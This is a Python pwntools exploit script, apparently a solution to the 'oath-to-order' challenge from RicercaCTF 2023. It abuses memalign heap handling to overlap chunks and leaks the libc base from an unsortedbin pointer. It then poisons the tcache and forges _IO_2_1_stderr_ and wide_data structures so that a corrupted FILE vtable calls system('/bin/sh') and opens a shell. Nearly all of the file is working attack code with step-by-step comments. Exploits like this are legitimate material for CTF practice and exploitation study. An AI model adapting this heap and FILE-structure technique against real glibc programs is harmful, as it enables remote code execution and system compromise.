#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "chall"
LIBCNAME = ""

hosts = ("oath-to-order.2023.ricercactf.com","localhost","localhost")
ports = (9003,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def create(ix: int, align: int, size: int, data: str):
  global c
  print(f"[CREATE] ix:{ix}, align:{align}, size:{size}, datalen:{len(data)}")
  print(c.recvuntil("1. Create"))
  c.sendlineafter("> ", b"1")
  c.sendlineafter("index: ",str(ix))
  if "inv" in str(c.recv(4)):
    return
  c.sendlineafter(": ", str(size))
  if "inv" in str(c.recv(4)):
    return
  c.sendlineafter(": ", str(align))
  if "inv" in str(c.recv(4)):
    return
  if '\n' in str(data):
    c.sendlineafter(": ", str(data).split('\n')[0])
  elif (len(data) == size - 1) and (size != 0) and (len(data) != 0):
    c.sendafter(": ", data)
  elif (len(data) >= size and size != 0):
    c.sendafter(": ", data[:size-1])
  else:
    c.sendlineafter(": ", data)

def show(ix: int):
  global c
  print(f"[SHOW] ix:{ix}")
  print(c.recvuntil("1. Create"))
  c.sendlineafter("> ", b"2")
  c.sendlineafter("index: ", str(ix))

def quit():
  global c
  c.sendlineafter("> ", "3")

  c.interactive()

def wait():
  input("WAITING INPUT...")

## exploit ###########################################

def exploit():
  global c

  # Alloc 3 chunks
  #  - A: freed(fast), size=0xF0, align=0x0
  #  - B: alloced    , size=0x20, align=0xF0
  #  - C: freed(fast), size=0x40, align=0x110
  # Then overwrite C's header with prev_size=0xF0, prev_in_use=false
  # Chunk refered by prev_size is allocated later.
  create(0, 0xF0, 0, b"A"*0x10 + p64(0xF0) + p32(0x40))
  # Alloc 2 chunks, using fastbin(A)
  #  - A1: alloced,         size=0x20, align=0x0
  #  - A2: freed(unsorted), size=0xD0, align=0x20
  # Then overwrite A2's header with 0xF1, which is same with C's prev_size.
  # A2 becomes valid prev chunk of C.
  #
  # Note that this is the first time to call __libc_malloc,
  # where tcache is initialized in chunk of size 0x290, because
  #  - memalign with too small align: calls `__libc_malloc`
  #  - normal memalign: calls `__int_memalign`, where `_int_malloc` is directly called
  # Therefore, tcache is initialized right after chunk C.
  create(1, 0, 0, b"B"*0x18 + p32(0xF1))
  # Alloc 2 chunks, using unsortedbin (A2)
  # A2 is the only chunk in unsortedbin and is a last_remainder,
  # so it is split into 2 chunks.
  #  - A2A: alloced, size=0xD0, align=0x20
  #  - A2B: freed(unsorted), size=0xF0
  # A2B is identical to B. Its fd and bk is overwritten with unsortedbin's addr.
  create(2, 0, 0xC0, "C" * 0x20)

  # Leak unsortedbin addr via fd of B(==A2B)
  show(0)
  unsorted = u64(c.recv(6).ljust(8, b"\x00"))
  print("[+] unsorted bin: " + hex(unsorted))
  printf = unsorted - 0x1b9570
  libcbase = printf - 0x60770
  print("[+] libc base: " + hex(libcbase))
  system = libcbase + 0x50d60
  io_stderr = libcbase + 0x21a6a0
  io_stdout = io_stderr + 0xE0
  io_wfile_jumps = libcbase + 0x2160c0
  main_arena = libcbase + 0x219c80
  setcontext = libcbase + 0x53a30
  print("[+] system: " + hex(system))
  print("[+] _IO_2_1_stderr_: " + hex(io_stderr))
  print("[+] main_arena: " + hex(main_arena))
  print("[+] setcontext: " + hex(setcontext))

  # Overwrite tcache in heap right after C.
  #   counts
  tcache = p16(1) # count of size=0x12 to 1
  tcache = tcache.ljust(0x80, b"\x00") # set other counts to 0
  #   entries
  tcache += p64(io_stderr)
  create(3, 0, 0, b"D"*0x58 + p64(0x291) + tcache)

  # Overwrite _IO_2_1_stderr_
  #  flags
  #  - & _IO_NO_WRITES(0x2): must be 0
  #  - & _IO_UNBUFFERED(0x8): must be 0
  #  To fulfill this condition, we just use spaces(0x20) before /bin/sh
  payload = b" " * 8 + b"/bin/sh\x00" # flags
  payload += p64(0x0) * int((0x90/8 - 1))
  payload += p64(0) # cvt
  payload += p64(io_stdout + 0x20) # wide_data
  payload += p64(0) * 3
  payload += p32(1)
  payload += b"\x00"*0x14
  payload += p64(io_wfile_jumps)

  ## stdout (== stderr->_wide_data)
  payload += p64(0) * 4 # becomes wide_vtable
  payload += p64(0) * 3 # read
  payload += p64(0) # write_base: must be NULL
  payload += p64(0x10) # write_ptr
  payload += p64(0x0) # write_end
  payload += p64(0x0) # buf_base
  payload += p64(system) * 4 # becomes wide_vtable->doalloc
  payload += p64(0) * 2 # state
  payload += p64(0) * int(0x70/8) # codecvt
  payload += p64(io_stdout) * 10 # wide_vtable

  create(4, 0, 0, payload)
  quit() # invoke _IO_wfile_overflow in _IO_all_lockp

  c.interactive()

## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
        #s = ssh('<USER>', '<HOST>', password='<PASSOWRD>')
        #c = s.process(executable='<BIN>')
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
